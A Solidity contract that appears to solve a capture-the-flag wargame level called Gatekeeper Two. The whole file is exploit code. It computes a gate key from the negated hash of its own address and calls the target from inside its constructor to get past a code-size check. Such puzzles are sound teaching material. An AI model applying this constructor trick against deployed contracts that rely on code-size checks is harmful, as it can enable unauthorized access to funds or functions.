// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttacker {
    constructor(address _target) {
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo(_target).enter(gateKey);
    }
}
